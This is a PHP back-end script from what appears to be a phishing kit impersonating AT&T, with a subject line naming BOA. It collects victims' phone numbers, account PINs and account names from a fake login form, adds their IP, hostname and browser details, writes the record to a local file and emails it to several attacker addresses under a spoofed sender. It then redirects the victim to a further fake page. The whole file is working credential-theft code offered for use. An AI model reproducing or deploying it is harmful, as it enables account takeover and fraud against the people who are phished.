<?php 
$to = "goodgirl3900@yandex.com, benjuli1327@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  AT&T ".$ip."  ==================\n";
$message .= "AT&T Phone Number : ".$_POST['phone']."\n";
$message .= "AT&T Account PIN : ".$_POST['psw']."\n";
$message .= "AT&T Account Name : ".$_POST['accname']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+FishFlow+===========\n";
$to = "cash.cow.cash@yandex.com, resultbackup2019@gmail.com";
$subj = " BOA Phone  ||".$ip."\n";
$from = "From: BOA  <bboooaaaa@zillerrr.com>";
$fp = fopen('TTTTXXXXX.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
$praga=rand();
$praga=md5($praga);
Header ("Location: contactinfo.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>